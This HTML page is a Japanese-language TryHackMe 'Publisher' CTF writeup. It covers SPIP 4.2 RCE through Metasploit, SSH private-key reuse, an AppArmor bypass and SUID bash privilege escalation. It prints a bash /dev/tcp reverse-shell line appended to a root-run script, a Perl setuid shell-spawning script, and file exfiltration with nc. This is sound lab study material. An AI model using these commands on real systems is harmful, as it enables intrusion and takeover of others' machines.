@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Publisher Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Publisher</h1>
+    <p>SPIP CMS RCE、SSH 鍵再利用、Docker/AppArmor 回避、SUID bash による権限昇格。</p>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Medium</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Linux</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+    
+    <article class="writeup-body">
+      <p>pingで疎通確認を行う</p>
+<p><img alt="Pasted image 20260416140358" src="publisher/images/01-Pasted-image-20260416140358.png"></p>
+<p>生きていることが確認できたのでnmapしてみる</p>
+<p><img alt="Pasted image 20260416141758" src="publisher/images/02-Pasted-image-20260416141758.png"></p>
+<p>port 22とport 80が空いている</p>
+<p>80(HTTP)が開いていたのでブラウザからアクセスしてみる<br>
+burpsuiteを起動する</p>
+<p><img alt="Pasted image 20260416142950" src="publisher/images/03-Pasted-image-20260416142950.png"></p>
+<p>「next」をクリック</p>
+<p><img alt="Pasted image 20260416143117" src="publisher/images/04-Pasted-image-20260416143117.png"></p>
+<p>「Start Burp」をクリック</p>
+<p><img alt="Pasted image 20260416143245" src="publisher/images/05-Pasted-image-20260416143245.png"></p>
+<p>「proxy」「intercept」「open browser」</p>
+<p><img alt="Pasted image 20260416144134" src="publisher/images/06-Pasted-image-20260416144134.png"></p>
+<p>エラーが出まくる死ぬ</p>
+<p><img alt="Pasted image 20260416144243" src="publisher/images/07-Pasted-image-20260416144243.png"></p>
+<p>なんか「OK」押したら立ち上がったのでipアドレスを入力してみる</p>
+<p><img alt="Pasted image 20260416144351" src="publisher/images/08-Pasted-image-20260416144351.png"></p>
+<p>課業終了時間なので帰ります</p>
+<hr>
+<p>出勤しました<br>
+attackboxではなく<br>
+openvpnから接続を試みた<br>
+<img alt="Pasted image 20260417090349" src="publisher/images/09-Pasted-image-20260417090349.png"><br>
+画像のようにpingは反応しないがnmapで2つのポートが確認できた<br>
+ブラウザからも同様にhttpページにアクセスすることができた</p>
+<p>Webページには特に怪しい箇所が見つけられなかったため、<br>
+ディレクトリブルートフォースを試みる</p>
+<p><img alt="Pasted image 20260417092628" src="publisher/images/10-Pasted-image-20260417092628.png"></p>
+<p>今回はferoxbusterを採用した</p>
+<p><img alt="Pasted image 20260417093229" src="publisher/images/11-Pasted-image-20260417093229.png"></p>
+<p>結果（とても長い）を見ると/spipディレクトリが大量に200ヒットしていることが分かる<br>
+実際/spipだけ解析速度が96/sと非常に時間がかかっていることが画像からも分かる</p>
+<p>いったんhttp://[ip address]/spipを見てみる</p>
+<p><img alt="Pasted image 20260417093641" src="publisher/images/12-Pasted-image-20260417093641.png"></p>
+<p>/spip以下が存在していることが分かる。ブログのようだ</p>
+<p>というかトップページを改めて見てみると「spip」という文字列が大量にあることに気づく<br>
+<img alt="Pasted image 20260417094610" src="publisher/images/13-Pasted-image-20260417094610.png"></p>
+<p>絶対ここを突く問題だろこれ</p>
+<p>「spip exploit」で検索する</p>
+<p><img alt="Pasted image 20260417094817" src="publisher/images/14-Pasted-image-20260417094817.png"></p>
+<p>いくつか検索したがこのページにpythonコードが乗っていてそのまま使えそうだった</p>
+<p><img alt="Pasted image 20260417095737" src="publisher/images/15-Pasted-image-20260417095737.png"></p>
+<p>コメントアウトを読むと4.2のバージョンだと使えるらしい<br>
+この問題のサイトはどのバージョンのspipを使っているのだろう</p>
+<p><img alt="Pasted image 20260417100523" src="publisher/images/16-Pasted-image-20260417100523.png"><br>
+aiに聞いてwhatwebというものを試してみたがspipのバージョン情報は得られず。<br>
+ubuntuでapacheを建てているということは分かった</p>
+<blockquote>
+<p>-vは冗長スキャンをするためのオプション</p>
+</blockquote>
+<p>他の方法をaiに聞いたところwappalyzerという拡張機能をおすすめされた<br>
+webページがどのような技術で構成するかを自動スキャンしてくれる</p>
+<p><img alt="Pasted image 20260417101146" src="publisher/images/17-Pasted-image-20260417101146.png"></p>
+<p>spipのページで今入れた拡張機能を試したところspipのバージョンは4.2であることがわかった<br>
+先ほど確認した脆弱性で示されていたバージョンと一致している</p>
+<p><img alt="Pasted image 20260417101518" src="publisher/images/18-Pasted-image-20260417101518.png"></p>
+<p>コードがあるけど使い方が分からないので少しの中身を読むと3つのオプションが示されていた<br>
+-uはURLでありrequiredとなっているので必須オプションかもしれない<br>
+-cもrequiredだがこれはなんのコマンドを入れたらよいだろうか<br>
+-vは冗長性モードのようだがデフォルトではオフになっている</p>
+<p>とりあえず</p>
+<pre><code class="language-python3">python3 exploit.py -u http://123.456.789.123 -c &quot;whoami&quot;
+</code></pre>
+<p>を実行してみる</p>
+<p><img alt="Pasted image 20260417102133" src="publisher/images/19-Pasted-image-20260417102133.png"><br>
+エラーが出た<br>
+どうやら1つのモジュールが正しい属性を持っていないようだった<br>
+エクスプロイトコード自体に落ち度がありそうなのでこれを解決するのは諦めて別の方法を探す</p>
+<p><img alt="Pasted image 20260417102326" src="publisher/images/20-Pasted-image-20260417102326.png"></p>
+<p>metasploitでspip関係のモジュールがないか探してみる</p>
+<p><img alt="Pasted image 20260417103012" src="publisher/images/21-Pasted-image-20260417103012.png"></p>
+<p>5つのモジュールがヒットした<br>
+ここからどのモジュールを選ぶかを考える<br>
+判断基準としてはrankが高いもの、そして日時ができるだけ新しいものを選ぶとよい<br>
+またtryhackmeやGPEN試験などのラボ環境であれば総当たり的に試すこともできるが<br>
+実際の侵入試験ではよく吟味した上で1つを選ぶ必要がある（by 横山曹長）</p>
+<p><img alt="Pasted image 20260417110811" src="publisher/images/22-Pasted-image-20260417110811.png"></p>
+<p>google検索してみるとspip未認証RCEへのモジュールに関する解説記事がヒットした</p>
+<p><img alt="Pasted image 20260417111339" src="publisher/images/23-Pasted-image-20260417111339.png"></p>
+<p><img alt="Pasted image 20260417111429" src="publisher/images/24-Pasted-image-20260417111429.png"></p>
+<p>saisiesプラグインが有効かどうかを確認する</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl -I http://10.48.155.207
+HTTP/1.1 200 OK
+Date: Fri, 17 Apr 2026 02:17:14 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Last-Modified: Wed, 20 Dec 2023 19:05:25 GMT
+ETag: &quot;21ee-60cf5aa5ef7f4&quot;
+Accept-Ranges: bytes
+Content-Length: 8686
+Vary: Accept-Encoding
+Content-Type: text/html
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl -I http://10.48.155.207/spip
+HTTP/1.1 301 Moved Permanently
+Date: Fri, 17 Apr 2026 02:17:24 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Location: http://10.48.155.207/spip/
+Content-Type: text/html; charset=iso-8859-1
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+
+</code></pre>
+<p>aiに少し聞くと/spip/local/config.txtを調べるとよいと言われたので調べてみた</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl -I http://10.48.155.207/spip/?page=plan                                                     
+HTTP/1.1 200 OK
+Date: Fri, 17 Apr 2026 02:21:48 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Cookie,Accept-Encoding
+Composed-By: SPIP 4.2.0 @ www.spip.net + http://10.48.155.207/spip/local/config.txt
+Link: &lt;http://10.48.155.207/spip/local/cache-css/186efc0a84a22eb9013d6317019d6fbe.css?1776385516&gt;;rel=&quot;preload&quot;;as=&quot;style&quot;;
+X-Spip-Cache: 86400
+Last-Modified: Fri, 17 Apr 2026 02:21:48 GMT
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl -I http://10.48.155.207/spip/local/config.txt                                               
+HTTP/1.1 200 OK
+Date: Fri, 17 Apr 2026 02:21:58 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Last-Modified: Wed, 20 Dec 2023 19:05:16 GMT
+ETag: &quot;1af-60cf5a9df683a&quot;
+Accept-Ranges: bytes
+Content-Length: 431
+Vary: Accept-Encoding
+Content-Type: text/plain
+
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ curl  http://10.48.155.207/spip/local/config.txt 
+Composed-By: SPIP @ www.spip.net + spip(4.2.0),aide(3.1.0),archiviste(2.2.0),compagnon(3.1.0),dump(2.1.0),images(4.1.0),forum(3.1.0),mediabox(3.1.0),mots(4.1.0),plan(4.1.0),porte_plume(3.1.1),revisions(3.1.0),safehtml(3.1.0),sites(4.1.0),stats(3.1.1),tw(3.1.1),urls(4.1.0),iterateurs(1.0.6),queue(0.6.8),jquery(3.6.3),csstidy(1.15.1),minidoc(1.0.3),ordoc(1.1.2),mejs(4.2.7),bigup(3.2.1),compresseur(2.1.1),medias(4.1.0),svp(3.1.1)
+
+┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ 
+
+
+</code></pre>
+<p>構成要素をまとめているconfigページにはsaisiesプラグインを利用している痕跡は見られなかった<br>
+ということで、いったんこの2025年リリースのモジュールは候補から外すこととする</p>
+<p><img alt="Pasted image 20260417112950" src="publisher/images/25-Pasted-image-20260417112950.png"></p>
+<p>休憩してきます</p>
+<hr>
+<p>休憩終わり</p>
+<p><img alt="Pasted image 20260417113631" src="publisher/images/26-Pasted-image-20260417113631.png"><br>
+それでは残りの4候補から実行モジュールを決めたいと思う<br>
+<img alt="Pasted image 20260417113631" src="publisher/images/26-Pasted-image-20260417113631.png"></p>
+<p>当該ページを再度見直す。<br>
+非常にメタいが画面左側のアーカイブ欄を見ると2023年秋からこのサイトの記事が更新されていることが分かる<br>
+そのため、このサイト自体は2023年に作られたものではないかと予想する<br>
+それが先ほど確認したspip4.2がリリースされた時期であるものと推測する（確認作業未実施）</p>
+<p>その場合、その2023年付近にリリースされたmetasploitのモジュールはこのバージョンに対する脆弱性を突いたものである可能性が高いものと推測する</p>
+<p><img alt="Pasted image 20260417113848" src="publisher/images/27-Pasted-image-20260417113848.png"></p>
+<p>ということで5番目のものを実行する<br>
+（モジュール名もよく見たらRCEのものらしいのでやりたいことに一致してそう）</p>
+<pre><code class="language-bash">msf &gt; use 16
+[-] The supplied module name is ambiguous: uninitialized constant HTTP.
+msf &gt; use exploit/multi/http/spip_rce_form 
+[-] The supplied module name is ambiguous: uninitialized constant HTTP.
+
+</code></pre>
+<p>モジュールを指定しようとしたらエラーが出たのでaiに聞いて <code>reload_all</code> を実施する</p>
+<p><img alt="Pasted image 20260417114547" src="publisher/images/28-Pasted-image-20260417114547.png"></p>
+<p><img alt="Pasted image 20260417114647" src="publisher/images/29-Pasted-image-20260417114647.png"></p>
+<p>改めて実行したところモジュールを指定することができた</p>
+<p>Requiredの設定項目がいくつかあるのでそれを設定していく<br>
+まず自分のipアドレスを確認する</p>
+<p><img alt="Pasted image 20260417115320" src="publisher/images/30-Pasted-image-20260417115320.png"><br>
+docker0はDockerコンテナ用の仮想ネットワーク。tryhackmeには使わない<br>
+eth0はPCやVMの普通のネットワーク<br>
+tun0はVPNのトンネル。tryhackmeのターゲットはvpnネットワーク上にいるので逆シェルの戻り先はtun0とする</p>
+<p><img alt="Pasted image 20260417115808" src="publisher/images/31-Pasted-image-20260417115808.png"></p>
+<p>RHOSTはtryhackme上のtarget ip adress<br>
+RPORTはhttpの80番ポート<br>
+LHOSTは先ほど確認したtun0<br>
+LPORTはデフォルトのままにする</p>
+<p>TARGETURIはHTTP系モジュールで狙うサイト内のパスを指定するもの。今回であれば/spip/を指定する</p>
+<blockquote>
+<p>wappalyzerでウェブサイトを構成する技術を調べた際に<br>
+トップページではspipが確認できなかったが<br>
+/spip/では確認できたため。</p>
+</blockquote>
+<p><img alt="Pasted image 20260417131845" src="publisher/images/32-Pasted-image-20260417131845.png"></p>
+<p>設定したものを確認する</p>
+<p><img alt="Pasted image 20260417132020" src="publisher/images/33-Pasted-image-20260417132020.png"></p>
+<p>確認できたので実行してみる</p>
+<p><img alt="Pasted image 20260417132735" src="publisher/images/34-Pasted-image-20260417132735.png"></p>
+<p><code>meterpreter&gt;</code> を出せた！（うれしい）</p>
+<p>しかし <code>shell</code> と打ち込んで以降しばらくかたまっている<br>
+claudeの指示にしたがってEnterを押下しても反応がない<br>
+いちど <code>Ctrl+C</code>　で戻る</p>
+<p><img alt="Pasted image 20260417133200" src="publisher/images/35-Pasted-image-20260417133200.png"></p>
+<p>かたまったと思っていたがコマンドを打ち込んだら返事があったので<br>
+すでにshellを起動できていたようだった</p>
+<p><code>pwd</code> の実行結果を見ると <code>home/think/spip/spip</code>とあるのでthinkという名前のユーザーがいるようだ</p>
+<p><img alt="Pasted image 20260417133520" src="publisher/images/36-Pasted-image-20260417133520.png"></p>
+<p><code>user.txt</code> を見つけた</p>
+<p>続いてroot flagを探す</p>
+<p><img alt="Pasted image 20260417133920" src="publisher/images/37-Pasted-image-20260417133920.png"></p>
+<p>今現在は <code>www-data</code> でログインしているようだ<br>
+rootという弱いパスワードでrootになれるか試したが失敗した</p>
+<p><img alt="Pasted image 20260417134737" src="publisher/images/38-Pasted-image-20260417134737.png"></p>
+<p>改めてファイルを確認するとuser.txtと同じ階層にsshに関するディレクトリがある<br>
+はじめnmapしたときにこのターゲット端末はhttpとsshがopenになっていたことを思い出すと<br>
+これを使って端末に入る方法があるんじゃないかという仮定を立てることができる<br>
+（できるか〜！）</p>
+<p><img alt="Pasted image 20260417135151" src="publisher/images/39-Pasted-image-20260417135151.png"><br>
+ファイルの権限をみるとrootでなくても中身が読めるようになってしまっている<br>
+id_rsaは秘密鍵<br>
+id_rsa.pubは公開鍵<br>
+authorized_keysは認証リスト</p>
+<blockquote>
+<p>本来の手順を確認しておくと<br>
+1　thinkさんの家で秘密鍵と公開鍵をgenerateする<br>
+2　公開鍵をサーバーのauthorized_keysに登録する<br>
+3　thinkさんがsshで接続したいと要求する<br>
+4　サーバーがauthorized_keysのリストの中にある公開鍵のどれかに対応する秘密鍵を持っているか尋ねる<br>
+5　thinkさんが対応する秘密鍵でそれを証明する<br>
+6　認証完了</p>
+</blockquote>
+<p>なので3つ全部ここにあるのはおかしい</p>
+<p>ということで秘密鍵をもらっていく</p>
+<p>kaliのローカルで/tryhackme/publisherというディレクトリを作成した</p>
+<p><img alt="Pasted image 20260417140739" src="publisher/images/40-Pasted-image-20260417140739.png"></p>
+<p>実際に接続していく</p>
+<p><img alt="Pasted image 20260417140950" src="publisher/images/41-Pasted-image-20260417140950.png"></p>
+<p><img alt="Pasted image 20260417141151" src="publisher/images/42-Pasted-image-20260417141151.png"></p>
+<p>「お前の鍵やばすぎ」とのことで断られてしまった。こんな機能あるのかすごいな。</p>
+<p><img alt="Pasted image 20260417141312" src="publisher/images/43-Pasted-image-20260417141312.png"></p>
+<p>chmod 600 id_rsaでパーミッションを振りなおしたところssh接続に成功した</p>
+<p>現在はthinkユーザーであるためrootに昇格することを考える<br>
+天下り的にここはlinpeas.shを使うことを考える</p>
+<blockquote>
+<p>Linux Privilege Escalation Awesome Script<br>
+Linuxで権限昇格できる穴を自動で探してくれるスクリプト</p>
+</blockquote>
+<p>これをローカルkaliで落として、ssh先に運ぶ<br>
+scpを使うやり方とpythonでサーバーを立てて向こうでwgetするやり方があるが<br>
+今回は後者でやってみる</p>
+<blockquote>
+<p>2つは使うプロトコルが違う。<br>
+前者はsshプロトコルで運んでくる<br>
+後者はhttpプロトコルで運んでくる<br>
+wgetはだいたいのホストができる操作なのでカバー範囲が広い</p>
+</blockquote>
+<p><img alt="Pasted image 20260417144730" src="publisher/images/44-Pasted-image-20260417144730.png"></p>
+<p>それではまずlinpeas.shをとってくる</p>
+<p><img alt="Pasted image 20260417145106" src="publisher/images/45-Pasted-image-20260417145106.png"></p>
+<p>helpオプションで場所を確認した</p>
+<p><img alt="Pasted image 20260417145403" src="publisher/images/46-Pasted-image-20260417145403.png"><br>
+使うものだけど作業ディレクトリに移動させた</p>
+<p><img alt="Pasted image 20260417145552" src="publisher/images/47-Pasted-image-20260417145552.png"></p>
+<p>作業ディレクトリにてサーバーを立てた</p>
+<p><img alt="Pasted image 20260417145810" src="publisher/images/48-Pasted-image-20260417145810.png"></p>
+<p>ssh先からwgetを実施したがエラーとなった<br>
+linpeas.shのダウンロードには成功したがそれをカレントディレクトリに書き込めなかったというエラー</p>
+<p>そこでつぎのコマンドから書き込みができるディレクトリを探す</p>
+<pre><code class="language-bash">find / -type d -perm -0002 -print 2&gt;/dev/null
+</code></pre>
+<blockquote>
+<p>find / はルート直下から探せ<br>
+-type d はディレクトリだけを探せ<br>
+-perm -0002はothersがwriteできるものを探せ→他人が書き込めるもの<br>
+-printは結果を出力しろ<br>
+2&gt;/dev/nullはエラーは出力するな</p>
+</blockquote>
+<p><img alt="Pasted image 20260417151351" src="publisher/images/49-Pasted-image-20260417151351.png"></p>
+<p>実施結果はこのようになった<br>
+/tmpや/var/tmpがヒットしている<br>
+tmpはたいてい権限が1777であり揮発性も高い</p>
+<blockquote>
+<p>/tmp 再起動で消える<br>
+/var/tmp 再起動で消えない</p>
+</blockquote>
+<p>tmpはnoexecでマウントされており書き込めるけど実行できない場合もある（今回は大丈夫）</p>
+<p>では実際に/var/tmpに移動して再度試みる<br>
+<img alt="Pasted image 20260417151523" src="publisher/images/50-Pasted-image-20260417151523.png"></p>
+<p>wgetすることができた<br>
+<img alt="Pasted image 20260417151641" src="publisher/images/51-Pasted-image-20260417151641.png"></p>
+<p>実行権限を付与する</p>
+<p><img alt="Pasted image 20260417152613" src="publisher/images/52-Pasted-image-20260417152613.png"></p>
+<p>実行した<br>
+<img alt="Pasted image 20260417152655" src="publisher/images/53-Pasted-image-20260417152655.png"></p>
+<p>テキストファイルも保存されている</p>
+<p>つぎはssh先からkaliにこのテキストファイルを送りたいのでncを使う<br>
+<img alt="Pasted image 20260417153119" src="publisher/images/54-Pasted-image-20260417153119.png"></p>
+<p>まずpythonサーバーを立てている作業ディレクトリにncをもってきた</p>
+<p>つぎssh先でこのncをwgetします<br>
+<img alt="Pasted image 20260417153348" src="publisher/images/55-Pasted-image-20260417153348.png"></p>
+<p>そしてkali側で口を開けて待ちます</p>
+<p><img alt="Pasted image 20260417153455" src="publisher/images/56-Pasted-image-20260417153455.png"></p>
+<p>ssh先でncを実行しkaliの10000番ポートに投げます</p>
+<p><img alt="Pasted image 20260417153630" src="publisher/images/57-Pasted-image-20260417153630.png"></p>
+<p><img alt="Pasted image 20260417153647" src="publisher/images/58-Pasted-image-20260417153647.png"></p>
+<p>しばらくしたらctrl+Cで抜けます</p>
+<p><img alt="Pasted image 20260417153922" src="publisher/images/59-Pasted-image-20260417153922.png"></p>
+<p>中身をlessで確認します</p>
+<p><img alt="Pasted image 20260417153944" src="publisher/images/60-Pasted-image-20260417153944.png"><br>
+かわいい</p>
+<p>qで抜けられます</p>
+<blockquote>
+<p>赤+黄色の背景  → 最優先、権限昇格できる可能性が高い<br>
+赤字          → 要注意<br>
+黄色          → 確認推奨<br>
+緑           → 一般情報、基本スキップ</p>
+</blockquote>
+<p>解析結果のすべてを読む必要はない</p>
+<p>退勤します</p>
+<hr>
+<p>出勤しました</p>
+<p>引き続きless -R output.txtにて中身を見ていきます</p>
+<p>権限昇格を考えるときに調べる優先順位</p>
+<blockquote>
+<p>sudo -l      ← まず最初に確認。設定ミスが多い<br>
+SUID SGID          ← GTFOBinsで一発解決することが多い<br>
+クレデンシャル   ← 意外と平文で残っていることが多い<br>
+Cronジョブ          ← 書き込み可能スクリプトがあれば確実<br>
+書き込み可能ファイル   ← /etc/passwdが甘いと即終わり<br>
+カーネルversion    ← 最終手段</p>
+</blockquote>
+<p>この優先順位にしたがって調べてみる<br>
+/を打つことで文字列検索ができる</p>
+<p><img alt="Pasted image 20260420110035" src="publisher/images/61-Pasted-image-20260420110035.png"></p>
+<p>収穫を得られず</p>
+<p>つづいてSUIDを調べる<br>
+<img alt="Pasted image 20260420110326" src="publisher/images/62-Pasted-image-20260420110326.png"><br>
+nを押下することで文字列検索の複数ヒットを巡ることができる<br>
+それらしき部分に来たがすべて赤文字でどれが発見事項なのかまるで分からない</p>
+<p>AIに尋ねると次の部分を調べるとよいとのことだった<br>
+<img alt="Pasted image 20260420110621" src="publisher/images/63-Pasted-image-20260420110621.png"></p>
+<p>Unknown SUID binaryの表示はバイナリがシステム標準ではなく人為的に作られたカスタムバイナリであることを示す</p>
+<p>ちなみにpkexecのCVEはrabbit hole（ダミーの脆弱性）</p>
+<p>ではthink@[target ip]に接続してこの/usr/sbin/run_containerを実行していく<br>
+<img alt="Pasted image 20260420111846" src="publisher/images/64-Pasted-image-20260420111846.png"><br>
+なにかの入力を求められた<br>
+何も入力せずEnterを押してみる<br>
+<img alt="Pasted image 20260420111957" src="publisher/images/65-Pasted-image-20260420111957.png"><br>
+どうやら/opt/run_container.shを実行しているらしいことが分かった<br>
+正しいidを入力できればline 16のエラーも取れるのだろうか<br>
+いったん 5) Quitする<br>
+<img alt="Pasted image 20260420112134" src="publisher/images/66-Pasted-image-20260420112134.png"><br>
+抜けた</p>
+<p>つまりこのrun_container.shはroot実行されるスクリプトである<br>
+<img alt="Pasted image 20260420112403" src="publisher/images/67-Pasted-image-20260420112403.png"><br>
+ls -laしてみると権限がすべて付与されていたのでこれを書き換えればよいのだ<br>
+コードの中身を読んだがまったく分からない<br>
+まあ普通にリバースシェルの1行だけ書き込む</p>
+<p><img alt="Pasted image 20260420112707" src="publisher/images/68-Pasted-image-20260420112707.png"></p>
+<p><img alt="Pasted image 20260420112751" src="publisher/images/69-Pasted-image-20260420112751.png"><br>
+謎の力が働いて保存に失敗しました<br>
+<img alt="Pasted image 20260420134853" src="publisher/images/70-Pasted-image-20260420134853.png"><br>
+backup fileが作れない！とエラー文で言っているのでbackupが保存される場所を探します<br>
+<img alt="Pasted image 20260420134937" src="publisher/images/71-Pasted-image-20260420134937.png"><br>
+tmpと出ました。</p>
+<p>echoから直接書き込む方法を試します</p>
+<pre><code class="language-bash">echo 'bash -i &gt;&amp; /dev/tcp/192.168.205.211/4444 0&gt;&amp;1' &gt;&gt; /opt/run_container.sh
+</code></pre>
+<p><img alt="Pasted image 20260420113951" src="publisher/images/72-Pasted-image-20260420113951.png"><br>
+実行したところ拒否されました。ありえない状況すぎます。<img alt="Pasted image 20260420114139" src="publisher/images/73-Pasted-image-20260420114139.png"><br>
+てかashってだれやねん<img alt="Pasted image 20260420114500" src="publisher/images/74-Pasted-image-20260420114500.png"><br>
+bashに切り替えてやったけどダメだ</p>
+<p>WriteUpにしたがって、ここでセキュリティソフトウェアの存在を疑ってみましょう<br>
+linpeasの出力結果でprotectionsで検索すれば該当項目が見つけられます<br>
+<img alt="Pasted image 20260420115533" src="publisher/images/75-Pasted-image-20260420115533.png"></p>
+<p>まずAppArmorの設定ファイルは<code>/etc/apparmor.d/</code>を見ればよい<br>
+しかしここにはいくつかのファイルがありどれを見ればよいか分かりづらい<img alt="Pasted image 20260420133455" src="publisher/images/76-Pasted-image-20260420133455.png"></p>
+<p>ここでAppArmor profile?に注目します<br>
+<img alt="Pasted image 20260420132627" src="publisher/images/77-Pasted-image-20260420132627.png"><br>
+<code>/usr/sbin/ash</code>との表記があるのでここにprofile？というか設定ファイルがあるものと推測します<br>
+ではcatで覗きます<br>
+<img alt="Pasted image 20260420135038" src="publisher/images/78-Pasted-image-20260420135038.png"><br>
+tmpに書き込み制限のルールがありました<br>
+エラーが原因がわかりましたね<img alt="Pasted image 20260420135141" src="publisher/images/79-Pasted-image-20260420135141.png"><br>
+ただしこのファイルはrootでないと編集ができません</p>
+<p>（とても色々調べているが難しい）</p>
+<hr>
+<p>apparmorのエクスプロイトを試みます<br>
+まずversionを知りたい<br>
+<img alt="Pasted image 20260420141145" src="publisher/images/80-Pasted-image-20260420141145.png"><br>
+これで調べてみましょう<br>
+<img alt="Pasted image 20260420142205" src="publisher/images/81-Pasted-image-20260420142205.png"><br>
+これを試します</p>
+<pre><code class="language-bash">cat &lt;&lt;'EOF' &gt; /var/tmp/test.pl
+#!/usr/bin/perl
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec &quot;/bin/sh&quot;;
+EOF
+</code></pre>
+<p>fileを作成したら権限を与えて</p>
+<pre><code class="language-bash">chmod +x /tmp/test.pl
+</code></pre>
+<p>実行する</p>
+<pre><code class="language-bash">/tmp/test.pl
+</code></pre>
+<hr>
+<p><img alt="Pasted image 20260420143858" src="publisher/images/82-Pasted-image-20260420143858.png"><br>
+ふと、apparmorプロファイルが消せるか試したがダメだった</p>
+<hr>
+<p><img alt="Pasted image 20260420144222" src="publisher/images/83-Pasted-image-20260420144222.png"></p>
+<p>なんでこれはいけるんだ。。。（これはwriteupにあったコードでありこのコード自体はもう消されているのでこれは使いたくない）</p>
+<p><img alt="Pasted image 20260420144441" src="publisher/images/84-Pasted-image-20260420144441.png"><br>
+調べてみるとここに**がないので<br>
+/var/tmp自体への書き込みはdenyされているが<br>
+/var/tmp直下への書き込みはできるらしい</p>
+<p><img alt="Pasted image 20260420150236" src="publisher/images/85-Pasted-image-20260420150236.png"><br>
+あともうひとつ<br>
+catを使うほうはtemp fileを作成する仕様があることがわかった<br>
+tmpファイルを許可がおりてない場所に置こうとしてしまうのでエラーが発生してしまう<br>
+これを回避するのがechoを使うやりかただ<br>
+<img alt="Pasted image 20260420150429" src="publisher/images/86-Pasted-image-20260420150429.png"><br>
+AIに助けて得てechoを用いるやり方で書き換えた</p>
+<p>では改めて</p>
+<p>fileを作成したら権限を与えて</p>
+<pre><code class="language-bash">chmod +x /var/tmp/test.pl
+</code></pre>
+<p>実行する</p>
+<pre><code class="language-bash">/var/tmp/test.pl
+</code></pre>
+<p><img alt="Pasted image 20260420150832" src="publisher/images/87-Pasted-image-20260420150832.png"></p>
+<p>なんかでたー（うれしい！）<br>
+<img alt="Pasted image 20260420150938" src="publisher/images/88-Pasted-image-20260420150938.png"><br>
+失礼。これはまだrootになっていないようでした<br>
+今はthinkから権限昇格できたのではなく<br>
+apparmorの外に出ることが出来ている状態です<br>
+ですのでvimで保存できなかったrun_container.shを編集することができます<br>
+<img alt="Pasted image 20260420151409" src="publisher/images/89-Pasted-image-20260420151409.png"><br>
+編集完了<br>
+<img alt="Pasted image 20260420151442" src="publisher/images/90-Pasted-image-20260420151442.png"><br>
+口を開けます<br>
+<img alt="Pasted image 20260420151545" src="publisher/images/91-Pasted-image-20260420151545.png"><br>
+いけたか？<br>
+<img alt="Pasted image 20260420151733" src="publisher/images/92-Pasted-image-20260420151733.png"><br>
+あれー？</p>
+<p>原因を調べたところ<br>
+bashが-pオプションなしだとSUIDをリセットするとのことだった（じゃあ意味なくね）<br>
+ということでそのオプションだけをvimでつけた<br>
+実行してみる</p>
+<p>いけないようだった<br>
+<img alt="Pasted image 20260420154220" src="publisher/images/93-Pasted-image-20260420154220.png"><br>
+reverse shellを諦めて<br>
+bash -pを追記した<br>
+これでbashをSUID権限で実行する<br>
+そういえば最初からこれでやればよかったのでは？<br>
+なんでreverse shellやろうとしてたんだっけ？<br>
+<img alt="Pasted image 20260420154514" src="publisher/images/94-Pasted-image-20260420154514.png"><br>
+普通に入れて普通に終わりました</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/publisher">https://tryhackme.com/room/publisher</a></p>
+  </footer>
+</body>
+</html>
